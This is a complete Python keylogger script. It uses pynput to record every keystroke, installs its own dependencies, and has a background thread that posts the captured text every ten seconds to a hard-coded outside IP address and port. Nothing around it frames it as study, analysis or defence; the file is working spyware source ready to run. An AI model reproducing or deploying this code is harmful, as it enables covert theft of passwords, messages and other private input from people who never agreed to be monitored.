import subprocess
import sys
import time
from pynput import keyboard
import requests
import json
import threading

def install_module(module_name):
    try:
        __import__(module_name)
    except ImportError:
        print(f"{module_name} not found. Installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])

install_module("pynput")
install_module("requests")

text = ""
ip_address = "3.108.221.78"  
port_number = "8080"         
time_interval = 10           
reconnect_interval = 5       

def send_post_req():
    global text
    while True:
        try:
            if text.strip():
                payload = json.dumps({"keyboardData": text})
                headers = {
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                }
                response = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers=headers)
                
                if response.status_code == 200:
                    print("Data sent successfully.")
                elif response.status_code == 403:
                    print("Forbidden: Check server configuration or CORS policy.")
                else:
                    print(f"Failed to send data. Status Code: {response.status_code}")
                
                text = ""
            else:
                print("No data to send.")

            time.sleep(time_interval)
        except requests.exceptions.RequestException as e:
            print(f"Couldn't complete request! Error: {e}")
            print(f"Retrying in {reconnect_interval} seconds...")
            time.sleep(reconnect_interval)

def on_press(key):
    global text
    try:
        if key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.shift:
            pass
        elif key == keyboard.Key.backspace and len(text) == 0:
            pass
        elif key == keyboard.Key.backspace and len(text) > 0:
            text = text[:-1]
        elif key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
            pass
        elif key == keyboard.Key.esc:
            return False
        else:
            text += str(key).strip("'")
    except Exception as e:
        print(f"Error processing key: {e}")

if __name__ == "__main__":
    threading.Thread(target=send_post_req, daemon=True).start()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()